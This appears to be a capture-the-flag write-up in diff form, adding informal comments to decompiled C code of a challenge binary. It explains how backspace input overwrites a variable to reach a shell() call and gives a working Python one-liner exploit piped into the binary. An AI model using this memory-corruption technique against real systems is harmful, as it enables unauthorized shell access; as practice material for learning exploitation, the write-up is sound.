@@ -32,15 +32,17 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
       {
         if ( v5 > 63 )
           puts("Oh no...Sorry !");
-        if ( v6 != 0xBFFFFABC )
+        if ( v6 != 0xBFFFFABC )		//if v6==0xbffffabc we get shell
           break;
         shell();
       }
       v3 = fileno(stdin);
       read(v3, &v4, 1u);
-      if ( v4 != 8 )
-        break;
-      --v5;
+      if ( v4 != 8 )			//if v5 == \x08
+        break;				//we see the position of v6 and buf
+is near !! wtf is that !! that mean stack cookie was on!!
+					//so we need to redirect with buf[-4]to overflow 4 byte at v6 !! Great ided!!
+      --v5;				//May be we need input "\x08" 4 times
       putchar(8);
     }
     if ( v4 > 8 )
@@ -70,3 +72,13 @@ LABEL_17:
   }
 }
 ```
+See the source code with my comment at each line!!
+overflow v6 become 0xbffffabc
+So we have the python script look like!
+```
+ (python -c 'print "\x08"*4+"\xbc\xfa\xff\xbf"';cat)|./ch16
+```
+
+we controled the shell !! GLHF!! 
+
+try it 
